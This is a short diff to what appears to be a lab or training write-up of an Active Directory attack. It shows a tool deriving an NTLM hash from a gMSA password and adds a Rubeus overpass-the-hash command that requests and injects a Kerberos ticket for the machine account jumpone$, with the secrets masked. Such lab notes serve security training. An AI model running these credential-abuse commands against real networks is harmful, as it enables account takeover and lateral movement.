@@ -36,3 +36,10 @@ python3 goldengmsapwdhash.py --password XyQLsufa2UdpxPeVN0Gj6Zv7nCTvb92[..snip..
  
 NTLM Hash: a2*******************************80
 ```
+
+**Move Further with OPTH**
+
+```bash
+C:\ad\Tools\Rubeus.exe asktgt /user:jumpone$ /domain:us.techcorp.local /rc4:a2****************************80 /ptt
+```
+
